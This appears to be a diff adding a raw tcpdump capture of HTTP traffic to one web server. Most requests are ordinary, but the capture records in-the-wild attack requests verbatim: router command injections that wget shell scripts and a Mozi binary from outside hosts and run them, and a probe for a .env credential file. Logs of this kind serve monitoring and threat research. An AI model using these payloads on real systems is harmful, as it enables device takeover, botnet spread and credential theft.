@@ -1,0 +1,201 @@
+21:39:20.772591 IP (tos 0x48, ttl 47, id 3044, offset 0, flags [DF], proto TCP (6), length 242)
+    179.97.168.114.57639 > 46.21.150.52.80: Flags [P.], cksum 0x2cdb (correct), seq 854415457:854415647, ack 251091841, win 2904, options [nop,nop,TS val 86938 ecr 24082075], length 190: HTTP, length: 190
+	GET / HTTP/1.1
+	Host: 46.21.150.52:80
+	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7
+	Content-Length: 0
+	
+21:39:20.781655 IP (tos 0x0, ttl 62, id 11577, offset 0, flags [DF], proto TCP (6), length 249)
+    46.21.150.52.80 > 179.97.168.114.57639: Flags [P.], cksum 0x6aa7 (correct), seq 1:198, ack 190, win 972, options [nop,nop,TS val 24082106 ecr 86938], length 197: HTTP, length: 197
+	HTTP/1.1 200 Ok
+	Server: 
+	Date: Thu, 12 Nov 2020 18:48:53 GMT
+	Content-Type: text/html; charset=iso-8859-1
+	Content-Length: 553
+	Last-Modified: Wed, 27 Oct 2010 02:19:53 GMT
+	Connection: close
+	
+21:39:20.782203 IP (tos 0x0, ttl 62, id 11578, offset 0, flags [DF], proto TCP (6), length 605)
+    46.21.150.52.80 > 179.97.168.114.57639: Flags [FP.], cksum 0xa833 (correct), seq 198:751, ack 190, win 972, options [nop,nop,TS val 24082106 ecr 86938], length 553: HTTP
+21:59:55.533603 IP (tos 0x0, ttl 55, id 10993, offset 0, flags [DF], proto TCP (6), length 331)
+    64.31.8.10.34636 > 46.21.150.52.80: Flags [P.], cksum 0xe66d (correct), seq 3311157954:3311158233, ack 1348761616, win 502, options [nop,nop,TS val 2412468100 ecr 24236450], length 279: HTTP, length: 279
+	GET /goform/setUsbUnload/.js?deviceName=A;cd%20/tmp%3Brm%20usb.sh%3Bwget%20http%3A//5.252.194.137/usb.sh%3Bchmod%20777%20usb.sh%3B./usb.sh HTTP/1.1
+	Host: 46.21.150.52:80
+	Connection: keep-alive
+	Accept-Encoding: gzip, deflate
+	Accept: */*
+	User-Agent: python-requests/2.22.0
+	
+21:59:55.535794 IP (tos 0x0, ttl 62, id 43443, offset 0, flags [DF], proto TCP (6), length 344)
+    46.21.150.52.80 > 64.31.8.10.34636: Flags [P.], cksum 0xc242 (correct), seq 1:293, ack 279, win 972, options [nop,nop,TS val 24236450 ecr 2412468100], length 292: HTTP, length: 292
+	HTTP/1.1 404 Not Found
+	Server: 
+	Date: Thu, 12 Nov 2020 18:59:10 GMT
+	Content-Type: text/html
+	Connection: close
+	
+	<HTML>
+	<HEAD><TITLE>404 Not Found</TITLE></HEAD>
+	<BODY BGCOLOR="#cc9999" TEXT="#000000" LINK="#2020ff" VLINK="#4040cc">
+	<H4>404 Not Found</H4>
+	File not found.
+	</BODY>
+	</HTML>
+22:21:47.416583 IP (tos 0x2,ECT(0), ttl 116, id 4247, offset 0, flags [DF], proto TCP (6), length 69)
+    69.162.99.42.61780 > 46.21.150.52.80: Flags [P.], cksum 0x8473 (correct), seq 1720007762:1720007791, ack 3029770251, win 256, length 29: HTTP, length: 29
+	HEAD /robots.txt HTTP/1.0
+	
+22:21:47.418863 IP (tos 0x2,ECT(0), ttl 62, id 61989, offset 0, flags [DF], proto TCP (6), length 332)
+    46.21.150.52.80 > 69.162.99.42.61780: Flags [P.], cksum 0xc26b (correct), seq 1:293, ack 29, win 913, length 292: HTTP, length: 292
+	HTTP/1.0 404 Not Found
+	Server: 
+	Date: Thu, 12 Nov 2020 19:10:06 GMT
+	Content-Type: text/html
+	Connection: close
+	
+	<HTML>
+	<HEAD><TITLE>404 Not Found</TITLE></HEAD>
+	<BODY BGCOLOR="#cc9999" TEXT="#000000" LINK="#2020ff" VLINK="#4040cc">
+	<H4>404 Not Found</H4>
+	File not found.
+	</BODY>
+	</HTML>
+22:25:27.985160 IP (tos 0x0, ttl 54, id 14316, offset 0, flags [DF], proto TCP (6), length 56)
+    114.35.177.126.37438 > 46.21.150.52.80: Flags [P.], cksum 0x1d97 (correct), seq 2859877039:2859877055, ack 461582142, win 3630, length 16: HTTP, length: 16
+	GET / HTTP/1.1
+22:25:28.127281 IP (tos 0x0, ttl 54, id 14317, offset 0, flags [DF], proto TCP (6), length 282)
+    114.35.177.126.37438 > 46.21.150.52.80: Flags [P.], cksum 0xc47e (correct), seq 16:258, ack 1, win 3630, length 242: HTTP
+22:25:28.139464 IP (tos 0x0, ttl 62, id 37594, offset 0, flags [DF], proto TCP (6), length 237)
+    46.21.150.52.80 > 114.35.177.126.37438: Flags [P.], cksum 0xbb31 (correct), seq 1:198, ack 258, win 980, length 197: HTTP, length: 197
+	HTTP/1.1 200 Ok
+	Server: 
+	Date: Thu, 12 Nov 2020 19:11:56 GMT
+	Content-Type: text/html; charset=iso-8859-1
+	Content-Length: 553
+	Last-Modified: Wed, 27 Oct 2010 02:19:53 GMT
+	Connection: close
+	
+22:25:28.139972 IP (tos 0x0, ttl 62, id 37595, offset 0, flags [DF], proto TCP (6), length 593)
+    46.21.150.52.80 > 114.35.177.126.37438: Flags [FP.], cksum 0xf1be (correct), seq 198:751, ack 258, win 980, length 553: HTTP
+22:53:27.406553 IP (tos 0x0, ttl 52, id 31379, offset 0, flags [DF], proto TCP (6), length 225)
+    91.234.62.19.51786 > 46.21.150.52.80: Flags [P.], cksum 0xa266 (correct), seq 2730895491:2730895664, ack 752182102, win 1460, options [nop,nop,TS val 1055347703 ecr 24637872], length 173: HTTP, length: 173
+	GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0
+	
+22:53:27.408441 IP (tos 0x0, ttl 62, id 37522, offset 0, flags [DF], proto TCP (6), length 344)
+    46.21.150.52.80 > 91.234.62.19.51786: Flags [P.], cksum 0xd319 (correct), seq 1:293, ack 173, win 972, options [nop,nop,TS val 24637933 ecr 1055347703], length 292: HTTP, length: 292
+	HTTP/1.0 404 Not Found
+	Server: 
+	Date: Thu, 12 Nov 2020 19:25:56 GMT
+	Content-Type: text/html
+	Connection: close
+	
+	<HTML>
+	<HEAD><TITLE>404 Not Found</TITLE></HEAD>
+	<BODY BGCOLOR="#cc9999" TEXT="#000000" LINK="#2020ff" VLINK="#4040cc">
+	<H4>404 Not Found</H4>
+	File not found.
+	</BODY>
+	</HTML>
+22:54:02.951919 IP (tos 0x0, ttl 53, id 3548, offset 0, flags [DF], proto TCP (6), length 56)
+    14.168.20.146.49491 > 46.21.150.52.80: Flags [P.], cksum 0x855e (correct), seq 1725969934:1725969950, ack 1025554701, win 7300, length 16: HTTP, length: 16
+	GET / HTTP/1.1
+22:54:03.419810 IP (tos 0x0, ttl 53, id 3549, offset 0, flags [DF], proto TCP (6), length 282)
+    14.168.20.146.49491 > 46.21.150.52.80: Flags [P.], cksum 0x2c46 (correct), seq 16:258, ack 1, win 7300, length 242: HTTP
+22:54:03.436098 IP (tos 0x0, ttl 62, id 47687, offset 0, flags [DF], proto TCP (6), length 237)
+    46.21.150.52.80 > 14.168.20.146.49491: Flags [P.], cksum 0x3050 (correct), seq 1:198, ack 258, win 980, length 197: HTTP, length: 197
+	HTTP/1.1 200 Ok
+	Server: 
+	Date: Thu, 12 Nov 2020 19:26:14 GMT
+	Content-Type: text/html; charset=iso-8859-1
+	Content-Length: 553
+	Last-Modified: Wed, 27 Oct 2010 02:19:53 GMT
+	Connection: close
+	
+22:54:03.436712 IP (tos 0x0, ttl 62, id 47688, offset 0, flags [DF], proto TCP (6), length 593)
+    46.21.150.52.80 > 14.168.20.146.49491: Flags [FP.], cksum 0x67dc (correct), seq 198:751, ack 258, win 980, length 553: HTTP
+23:30:18.524548 IP (tos 0x0, ttl 53, id 15416, offset 0, flags [DF], proto TCP (6), length 235)
+    201.49.229.175.48221 > 46.21.150.52.80: Flags [P.], cksum 0x54b9 (correct), seq 1126603653:1126603836, ack 917890449, win 1800, options [nop,nop,TS val 108487 ecr 24914296], length 183: HTTP, length: 183
+	GET / HTTP/1.1
+	Host: 46.21.150.52:80
+	User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36
+	Content-Length: 0
+	
+23:30:18.539320 IP (tos 0x0, ttl 62, id 52228, offset 0, flags [DF], proto TCP (6), length 249)
+    46.21.150.52.80 > 201.49.229.175.48221: Flags [P.], cksum 0x372d (correct), seq 1:198, ack 183, win 972, options [nop,nop,TS val 24914323 ecr 108487], length 197: HTTP, length: 197
+	HTTP/1.1 200 Ok
+	Server: 
+	Date: Thu, 12 Nov 2020 19:44:21 GMT
+	Content-Type: text/html; charset=iso-8859-1
+	Content-Length: 553
+	Last-Modified: Wed, 27 Oct 2010 02:19:53 GMT
+	Connection: close
+	
+23:30:18.539799 IP (tos 0x0, ttl 62, id 52229, offset 0, flags [DF], proto TCP (6), length 605)
+    46.21.150.52.80 > 201.49.229.175.48221: Flags [FP.], cksum 0x6db8 (correct), seq 198:751, ack 183, win 972, options [nop,nop,TS val 24914323 ecr 108487], length 553: HTTP
+23:36:28.405508 IP (tos 0x0, ttl 240, id 15686, offset 0, flags [none], proto TCP (6), length 108)
+    62.240.181.20.40462 > 46.21.150.52.80: Flags [P.], cksum 0x170e (correct), seq 4005401654:4005401722, ack 3786056130, win 1300, length 68: HTTP, length: 68
+	GET / HTTP/1.0
+	Host: 46.21.150.52
+	Accept: text/plain,text/html
+	
+23:36:28.419199 IP (tos 0x0, ttl 62, id 31933, offset 0, flags [DF], proto TCP (6), length 237)
+    46.21.150.52.80 > 62.240.181.20.40462: Flags [P.], cksum 0xd90b (correct), seq 1:198, ack 68, win 14600, length 197: HTTP, length: 197
+	HTTP/1.0 200 Ok
+	Server: 
+	Date: Thu, 12 Nov 2020 19:47:26 GMT
+	Content-Type: text/html; charset=iso-8859-1
+	Content-Length: 553
+	Last-Modified: Wed, 27 Oct 2010 02:19:53 GMT
+	Connection: close
+	
+23:36:28.419347 IP (tos 0x0, ttl 62, id 31934, offset 0, flags [DF], proto TCP (6), length 576)
+    46.21.150.52.80 > 62.240.181.20.40462: Flags [.], cksum 0x9c4b (correct), seq 198:734, ack 68, win 14600, length 536: HTTP
+23:36:28.419745 IP (tos 0x0, ttl 62, id 31935, offset 0, flags [DF], proto TCP (6), length 57)
+    46.21.150.52.80 > 62.240.181.20.40462: Flags [FP.], cksum 0x8cec (correct), seq 734:751, ack 68, win 14600, length 17: HTTP
+00:04:58.050212 IP (tos 0x0, ttl 52, id 20472, offset 0, flags [DF], proto TCP (6), length 258)
+    182.1.63.59.28312 > 46.21.150.52.80: Flags [P.], cksum 0x7b09 (correct), seq 830052438:830052644, ack 27909444, win 11, options [nop,nop,TS val 2023741597 ecr 25174230], length 206: HTTP, length: 206
+	GET /.env HTTP/1.1
+	Host: 46.21.150.52
+	Accept-Encoding: gzip, deflate
+	Accept: */*
+	User-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36
+	
+00:04:58.052720 IP (tos 0x0, ttl 62, id 64946, offset 0, flags [DF], proto TCP (6), length 344)
+    46.21.150.52.80 > 182.1.63.59.28312: Flags [P.], cksum 0xa8b7 (correct), seq 1:293, ack 206, win 972, options [nop,nop,TS val 25174261 ecr 2023741597], length 292: HTTP, length: 292
+	HTTP/1.1 404 Not Found
+	Server: 
+	Date: Thu, 12 Nov 2020 20:01:41 GMT
+	Content-Type: text/html
+	Connection: close
+	
+	<HTML>
+	<HEAD><TITLE>404 Not Found</TITLE></HEAD>
+	<BODY BGCOLOR="#cc9999" TEXT="#000000" LINK="#2020ff" VLINK="#4040cc">
+	<H4>404 Not Found</H4>
+	File not found.
+	</BODY>
+	</HTML>
+00:05:00.317275 IP (tos 0x0, ttl 52, id 18443, offset 0, flags [DF], proto TCP (6), length 324)
+    182.1.47.175.37941 > 46.21.150.52.80: Flags [P.], cksum 0x29b8 (correct), seq 642623625:642623897, ack 52896588, win 11, options [nop,nop,TS val 2023743865 ecr 25174514], length 272: HTTP, length: 272
+	POST / HTTP/1.1
+	Host: 46.21.150.52
+	Accept-Encoding: gzip, deflate
+	Accept: */*
+	User-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36
+	Content-Length: 20
+	Content-Type: application/x-www-form-urlencoded
+	
+00:05:00.326749 IP (tos 0x0, ttl 62, id 350, offset 0, flags [DF], proto TCP (6), length 249)
+    46.21.150.52.80 > 182.1.47.175.37941: Flags [P.], cksum 0x830e (correct), seq 1:198, ack 272, win 972, options [nop,nop,TS val 25174546 ecr 2023743865], length 197: HTTP, length: 197
+	HTTP/1.1 200 Ok
+	Server: 
+	Date: Thu, 12 Nov 2020 20:01:42 GMT
+	Content-Type: text/html; charset=iso-8859-1
+	Content-Length: 553
+	Last-Modified: Wed, 27 Oct 2010 02:19:53 GMT
+	Connection: close
+	
+00:05:00.327329 IP (tos 0x0, ttl 62, id 351, offset 0, flags [DF], proto TCP (6), length 605)
+    46.21.150.52.80 > 182.1.47.175.37941: Flags [FP.], cksum 0xb98d (correct), seq 198:751, ack 272, win 972, options [nop,nop,TS val 25174546 ecr 2023743865], length 553: HTTP
+00:05:00.564266 IP (tos 0x0, ttl 52, id 18444, offset 0, flags [DF], proto TCP (6), length 72)
+    182.1.47.175.37941 > 46.21.150.52.80: Flags [P.], cksum 0x83c3 (correct), seq 272:292, ack 1, win 11, options [nop,nop,TS val 2023744112 ecr 25174545], length 20: HTTP
